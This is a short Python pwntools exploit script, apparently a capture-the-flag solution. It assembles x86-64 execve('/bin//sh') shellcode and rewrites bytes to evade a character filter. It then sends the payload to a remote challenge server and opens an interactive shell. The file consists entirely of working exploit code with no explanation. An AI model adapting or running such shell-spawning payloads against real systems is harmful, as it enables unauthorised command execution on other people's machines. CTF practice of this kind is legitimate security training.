#!/usr/bin/env python

from pwn import *

shellcode = """
    mov rbx, 0xFF978CD091969DD1
    neg r11
    push r11
    /* neg rbx */
    /* push rbx */
    xor eax, eax
    cdq
    xor esi, esi
    push rsp
    pop rdi
    mov al, 0x3b  /* sys_execve */
    syscall
"""
payload = asm(shellcode, arch = 'amd64')
payload = payload.replace('H', 'I')

# endpoint = process("level-0")
endpoint = remote("ctf.reversing.io", 32101)

endpoint.send(payload)
endpoint.interactive()
